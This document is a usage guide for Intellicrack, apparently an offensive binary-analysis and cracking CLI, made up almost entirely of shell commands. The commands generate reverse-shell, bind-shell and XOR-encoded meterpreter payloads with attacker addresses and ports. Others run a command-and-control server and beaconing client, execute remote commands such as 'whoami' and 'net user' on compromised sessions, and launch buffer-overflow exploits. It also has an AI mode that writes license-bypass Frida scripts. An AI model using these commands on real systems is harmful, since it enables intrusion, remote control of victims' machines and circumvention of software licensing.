# Intellicrack CLI - Usage Examples

This document provides practical examples of using the Intellicrack CLI with its actual available commands.

## Basic Analysis

### Vulnerability Scanning
```bash
# Scan a binary for vulnerabilities
python cli/cli.py scan binary.exe --vulns --output scan_results.json

# Extract strings from a binary
python cli/cli.py strings binary.exe --min-length 8 --output strings.txt

# Basic binary analysis
python cli/cli.py analyze binary.exe --deep --output analysis.json
```

### Binary Analysis
```bash
# Comprehensive analysis
python cli/cli.py analyze binary.exe --mode comprehensive --verbose

# Vulnerability-focused analysis
python cli/cli.py analyze binary.exe --mode vulnerability

# Protection detection
python cli/cli.py analyze binary.exe --mode protection
```

## Payload Generation

### Generate Payloads
```bash
# Generate a reverse shell payload
python cli/cli.py payload generate --type reverse_shell --arch x64 --lhost 192.168.1.100 --lport 4444 --output payload.bin

# Generate a bind shell
python cli/cli.py payload generate --type bind_shell --arch x86 --lport 8080 --output bind_shell.exe

# Generate with encoding
python cli/cli.py payload generate --type meterpreter --arch x64 --lhost 10.0.0.1 --lport 5555 --encoding xor --output encoded_payload.bin
```

### Payload Templates
```bash
# List available payload templates
python cli/cli.py payload list-templates

# Generate from template
python cli/cli.py payload from-template shell reverse_shell --arch x64 --param lhost=192.168.1.100 --param lport=4444 --output template_payload.bin
```

## Command and Control

### C2 Server
```bash
# Start C2 server on default ports
python cli/cli.py c2 server --host 0.0.0.0

# Start with custom ports
python cli/cli.py c2 server --host 192.168.1.100 --https-port 8443 --tcp-port 9999

# Start with encryption
python cli/cli.py c2 server --protocols https tcp --encryption aes256
```

### C2 Client
```bash
# Connect to C2 server
python cli/cli.py c2 client --server 192.168.1.100 --port 8443 --protocol https

# Connect with beacon interval
python cli/cli.py c2 client --server c2.example.com --interval 300
```

### Remote Commands
```bash
# List active sessions
python cli/cli.py c2 exec list

# Execute command on session
python cli/cli.py c2 exec session_123 "whoami"

# Interactive shell
python cli/cli.py c2 exec session_456 "cmd.exe" --interactive
```

## Exploitation

### Target Exploitation
```bash
# Exploit a target with auto-detection
python cli/cli.py exploit vulnerable.exe --type auto --payload custom_payload.bin

# Buffer overflow exploitation
python cli/cli.py exploit target.exe --type buffer_overflow --payload buffer_overflow.bin
```

## AI Features

### Script Generation
```bash
# Generate Frida script
python cli/cli.py ai generate target.exe --script-type frida --focus license --output frida_script.js

# Generate Ghidra script
python cli/cli.py ai generate binary.exe --script-type ghidra --complexity advanced --output ghidra_script.py
```

### AI Analysis
```bash
# AI-powered binary analysis
python cli/cli.py ai analyze malware.exe --output ai_analysis.json --deep

# Test generated scripts
python cli/cli.py ai test generated_script.js --binary target.exe
```

### Autonomous AI
```bash
# Run autonomous analysis
python cli/cli.py ai autonomous "Analyze this binary for vulnerabilities and generate bypass scripts"
```

## Advanced Workflows

### Complete Security Assessment
```bash
# Run full security analysis pipeline
python cli/cli.py scan target.exe --vulns --output vuln_scan.json
python cli/cli.py strings target.exe --filter "password|key|secret" --output sensitive_strings.txt
python cli/cli.py analyze target.exe --mode comprehensive --output full_analysis.json
python cli/cli.py ai analyze target.exe --deep --output ai_insights.json
```

### C2 Operation Workflow
```bash
# Set up C2 infrastructure
python cli/cli.py c2 server --host 0.0.0.0 --protocols https tcp

# In another terminal, connect client
python cli/cli.py c2 client --server localhost --protocol https

# Execute commands remotely
python cli/cli.py c2 exec session_001 "systeminfo"
python cli/cli.py c2 exec session_001 "net user" --interactive
```

### Payload Development
```bash
# Generate and test payload
python cli/cli.py payload generate --type reverse_shell --lhost 127.0.0.1 --lport 9001 --output test_payload.bin
python cli/cli.py payload list-templates --category shell

# Create custom payload from template
python cli/cli.py payload from-template shell bind_shell --arch x64 --param lport=8080 --output custom_bind_shell.bin
```

## Integration Examples

### Batch Processing
```bash
# Process multiple files
# Create a text file with one binary path per line
echo "binary1.exe" > batch_list.txt
echo "binary2.dll" >> batch_list.txt

# Note: Batch processing not currently implemented
# python cli/cli.py batch batch_list.txt --comprehensive
```

### Output Formatting
```bash
# JSON output for automation
python cli/cli.py scan binary.exe --vulns --quiet --output results.json

# Verbose output for debugging
python cli/cli.py analyze binary.exe --verbose --output debug.log
```

## Error Handling

### With Error Tolerance
```bash
# Continue on errors where possible
python cli/cli.py analyze problem_binary.exe --mode comprehensive || echo "Analysis completed with warnings"
```

### Debugging Issues
```bash
# Enable verbose logging
export INTELLICRACK_VERBOSE=1
python cli/cli.py scan binary.exe --vulns

# Check for import issues
python -c "import intellicrack.cli.cli; print('CLI imports successfully')"
```

These examples demonstrate the actual capabilities of the Intellicrack CLI as implemented in the codebase.
